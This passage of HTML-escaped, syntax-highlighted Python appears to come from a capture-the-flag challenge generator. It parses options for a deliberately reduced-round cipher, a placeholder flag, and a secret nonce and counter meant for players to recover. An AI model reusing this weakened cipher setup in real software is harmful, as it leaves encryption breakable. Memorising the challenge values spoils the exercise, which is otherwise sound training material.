    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--flag_string&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;CTF{TestFlag_123456789012345678901234567890123456789012345678}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;The actual secret flag string to be encrypted.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--rounds&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Actual number of rounds to execute (1-8, default: 2 for a very weak variant).&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--message_size_bytes&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Size of P_common in learning dataset (bytes, default: 64).&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--known_key_active_material_hex&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;known_key_active_material_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Hex string for the non-zero part of the known key. &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--secret_target_nonce_hex&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000000800000000000000000&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;SECRET nonce (hex, 24 chars, first 4 hex chars/2 bytes must be &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0000&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;) to be recovered by player. Typically from set_secrets.sh.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--secret_target_counter_int&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2147483648&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;SECRET counter to be recovered by player. Typically from set_secrets.sh.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--num_nonce_variations&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Number of distinct nonce patterns for learning set (default: 32).&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--num_counter_variations&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Number of distinct counter values for each nonce pattern in learning set (default: 32).&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ERROR: --rounds must be 1-8.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;fromhex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;known_key_active_material_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ValueError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ERROR: --known_key_active_material_hex invalid hex.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_target_nonce_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_target_nonce_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;startswith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0000&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ERROR: --secret_target_nonce_hex must be 24 hex chars and start with &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0000&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;fromhex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_target_nonce_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ValueError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ERROR: --secret_target_nonce_hex invalid hex.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num_nonce_variations&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num_counter_variations&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ERROR: Variation counts must be at least 1.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message_size_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ERROR: --message_size_bytes must be at least 1.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;output_package_file_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;output_package_file_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parents&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exist_ok&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;generate_challenge_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag_string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounds_to_run&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message_size_bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message_size_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;known_key_active_material_hex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;known_key_active_material_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret_target_nonce_hex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_target_nonce_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret_target_counter_int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_target_counter_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num_nonce_variations&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num_nonce_variations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num_counter_variations&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span 